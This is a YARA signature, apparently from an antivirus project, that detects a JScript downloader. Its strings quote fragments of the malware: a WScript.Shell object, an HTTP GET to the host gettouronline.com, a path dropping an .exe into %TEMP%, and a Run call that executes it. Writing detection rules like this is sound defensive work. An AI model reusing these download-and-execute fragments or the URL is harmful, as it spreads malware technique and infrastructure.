rule sig_20160328_427447f831ac58fe5386456d6b7f8602 {
  meta:
    description = "datamaliciousorder - file 20160328_427447f831ac58fe5386456d6b7f8602.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "92db7c676b88fecef697280296f410cc79c1d807c0af588ff51f059f23f1b579"

  strings:
    $s1  = "function Bjcfir() {return Fwdekoa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"OWFbibh5DVc.exe\";};" fullword ascii
    $s2  = "Ealwqpio[Kbsltwqu](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Xjxgzl](Clnksbi() * 11)} while (Ealwqpio[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Fwdekoa = function Fzhvzejl() {return WScript[Apzfhkrh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Vszhij(Cdeum, Bwgxba){return Cdeum - Bwgxba;};" fullword ascii
    $s6  = "function Unfgxewaq() {return ((Uwjvtpjy == true) && (Uwjvtpjy == Qjxuo)) ? 1 : Hkfjac;};" fullword ascii
    $s7  = "function Cxavbgg(Qeqfnyv){Fwdekoa[\"Run\"](Qeqfnyv, Hkfjac, Hkfjac);};" fullword ascii
    $s8  = "return Vszhij(Lflnupshnx, Gmkbksbzzs);" fullword ascii
    $s9  = "Uwjvtpjy = true; " fullword ascii
    $s10 = "var Ueqdcts = false;" fullword ascii
    $s11 = "function Wedml()" fullword ascii
    $s12 = "var Uwjvtpjy = false;" fullword ascii
    $s13 = "var Luyzsum = new this[\"Date\"]();" fullword ascii
    $s14 = "var Qjxuo = false;" fullword ascii
    $s15 = " while (Xeibld){" fullword ascii
    $s16 = "function Uagtyolqvn(Ejttj) {var Ulygl = (1, 2, 3, 4, 5, Ejttj); return Ulygl;};" fullword ascii
    $s17 = "function Mnakgpstwx(){return Apzfhkrh;};" fullword ascii
    $s18 = "function Xrliydxqwk(){return Lbnjwbf;};" fullword ascii
    $s19 = "Qjxuo = true; " fullword ascii
    $s20 = "function Clnksbi(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}